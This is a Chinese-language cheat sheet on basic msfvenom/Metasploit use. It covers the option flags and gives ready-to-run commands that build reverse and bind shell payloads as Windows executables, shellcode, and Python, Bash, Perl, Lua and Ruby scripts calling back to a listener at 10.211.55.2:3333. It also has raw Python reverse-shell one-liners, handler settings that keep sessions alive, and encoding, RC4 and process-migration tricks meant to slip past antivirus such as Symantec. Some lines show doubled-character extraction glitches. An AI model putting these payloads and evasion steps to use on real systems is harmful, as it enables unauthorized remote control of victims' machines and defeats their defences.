# msf.基础使用

# links

```
https://www.offsec.com/metasploit-unleashed/msfvenom/
http://www.secist.com/archives/4809.html
http://www.secist.com/videos/index.html
https://blog.wohin.me/categories/metasploit/
http://www.mi1k7ea.com/2021/03/06/MSF-payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF/

```

# 使用

```
-p, --payload    <payload>       指定需要使用的payload(攻击载荷)。如果需要使用自定义的payload，请使用&#039;-&#039;或者stdin指定

-l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all

-n, --nopsled    <length>        为payload预先指定一个NOP滑动长度

-f, --format     <format>        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)

-e, --encoder    [encoder]       指定需要使用的encoder（编码器）

-a, --arch       <architecture>  指定payload的目标架构

--platform   <platform>      指定payload的目标平台

-s, --space      <length>        设定有效攻击荷载的最大长度

-b, --bad-chars  <list>          设定规避字符集，比如:\\x00\\xff

-i, --iterations <count>         指定payload的编码次数

-c, --add-code   <path>          指定一个附加的win32 shellcode文件

-x, --template   <path>          指定一个自定义的可执行文件作为模板

-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行

--payload-options            列举payload的标准选项

-o, --out   <path>               保存payload

-v, --var-name <name>            指定一个自定义的变量，以确定输出格式

--shellest                   最小化生成payload

-h, --help                       查看帮助选项

--help-formats               查看msf支持的输出格式列表

```

# 常用指令

要Windows平台下的payload

```
msfvenom --list payload |grep windows

```

查看该payload支持的平台

```
msfvenom -p windows/shell/reverse_tcp --list archs

```

查看payload可以用哪些语言实现

```
msfvenom -p windows/shell/reverse_tcp -a x64 --list formats

```

查看该payload可以使用的参数

```
msfvenom -p windows/shell/reverse_tcp --list-options

```

当然这只是最基础的操作，msfvenom集成了msfpayload和msfencoder，还可以添加其他的指令，

通过编码和迭代来避免杀毒软件的查杀。

```
msfvenom -p windows/meterpreter/reverse_tcp   LHOST=10.211.55.2 LPORT=3333   -f c

```

比如想查看`windows/meterpreter/reverse_tcp`支持什么平台、哪些选项，可以使用

```
msfvenom -p windows/meterpreter/reverse_tcp --list-options

```

查看所有payloads

```
msfvenom --list payloads

```

查看所有编码器

```
msfvenom --list encoders

```

类似可用`msfvenom --list`命令查看的还有`payloads, encoders, nops, platforms, archs, encrypt, formats`

# 生成二进制文件

windows下生成32位/64位payload时需要注意：

以windows/meterpreter/reverse_tcp为例，该payload默认为32位，也可使用-a x86选项指定。

如果要生成64位，则payload为windows/x64/meterpreter/reverse_tcp。

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f exe > shell.exe

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f exe > shell.exe

```

**Netcat**

nc正向连接

```jsx
msfvenom -p windows/shell_hidden_bind_tcp LHOST=10.211.55.2 LPORT=3333  -f exe> 1.exe

```

复制

nc反向连接，监听

```jsx
msfvenom -p windows/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333  -f exe> 1.exe

```

# 生成shellcode

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f c

```

# 生成脚本

为什么这里我会写出关于脚本的

就python脚本而言,,被人是可以打包为exe的

**Python反弹shell**

```jsx
msfvenom -p cmd/unix/reverse_python LHOST=10.211.55.2 LPORT=3333 -f raw > shell.py

msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw > shell.py

```

复制

**Python正向shell**

```jsx
python/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.211.55.2",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

python/python3 -c "exec(\\"import socket, subprocess;s = socket.socket();s.connect(("10.211.55.2",3333))\\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\\")"

```

复制

**Bash**

```jsx
msfvenom -p cmd/unix/reverse_bash LHOST=10.211.55.2 LPORT=3333 -f raw > shell.sh

```

复制

**Perl**

```jsx
msfvenom -p cmd/unix/reverse_perl LHOST=10.211.55.2 LPORT=3333 -f raw > shell.pl

```

复制

**Lua**

```jsx
msfvenom -p cmd/unix/reverse_lua LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.lua

```

复制

**Ruby**

```jsx
msfvenom -p ruby/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.rb

```

# 使用注意事项

防⽌止假session

在实战中，经常会遇到假session或者刚连接就断开的情况，这⾥里里补充⼀一些监听参数，防⽌止假死与假session。

```
msf exploit(multi/handler) > set ExitOnSession false //可以在接收到seesion后继续监听端口，保持侦听

```

防⽌止session意外退出

```
msf5 exploit(multi/handler) > set SessionCommunicationTimeout 0
//默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0

msf5 exploit(multi/handler) > set SessionExpirationTimeout 0
//默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭

```

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -b "\\x00" -i 5 -a x86 --
platform win PrependMigrate=true PrependMigrateProc=svchost.exe -f exe -o shell.exe

```

# stage进⾏行行编码

什么是stage?

这是 green-m ⼤大佬提到的⼀一种⽅方式，使⽤用reverse_https等payload时可以使⽤用下列列⽅方法bypass部分杀软。

⽣生成`payload: msfvenom -p windows/meterpreter/reverse_https lhost=10.211.55.2 lport=3333 -f c`

在msf中进⾏行行如下设置，将控制端向被控制端发送的stage进⾏行行编码

```
msf exploit(multi/handler) > set EnableStageEncoding true //尝试使用不同的编码器对stage进行编码，可能绕过部分杀软的查杀
EnableStageEncoding => true
msf exploit(multi/handler) > set stageencoder x86/fnstenv_mov
Stageencoder => x64/xor
msf exploit(multi/handler) > set stageencodingfallback false
stageencodingfallback => false

```

同样，使⽤用reverse_tcp_rc4也有同样的效果，⽽而且不不能设置stageencoder选项，更更稳定更更⽅方便便

```
msfvenom -p windows/meterpreter/reverse_tcp_rc4 lhost=10.211.55.2 lport=3333 RC4PASSWORD=tidesec -f c

```

利利⽤用rc4对传输的数据进⾏行行加密，密钥在⽣生成时指定，在监听的服务端设置相同的密钥。

就可以在symantec眼⽪皮地下执⾏行行meterpreter。